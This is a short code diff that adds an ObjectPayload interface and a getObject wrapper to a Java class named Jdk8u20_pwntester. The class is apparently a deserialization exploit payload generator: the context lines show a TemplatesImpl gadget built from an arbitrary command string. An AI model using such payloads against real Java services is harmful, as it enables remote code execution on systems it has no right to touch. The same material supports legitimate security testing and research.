@@ -15,7 +15,7 @@ import java.util.LinkedHashSet;
 
 import static java.io.ObjectStreamConstants.*;
 
- public class Jdk8u20_pwntester {
+ public class Jdk8u20_pwntester implements ObjectPayload{
 
      public static byte[] getPayload( String command) throws Exception{
          TemplatesImpl templates = (TemplatesImpl) Gadgets.createTemplatesImpl(command);
@@ -166,4 +166,8 @@ import static java.io.ObjectStreamConstants.*;
          Deserializer.deserialize(b);
      }
 
+     @Override
+     public Object getObject(String command) throws Exception {
+         return getPayload(command);
+     }
  }
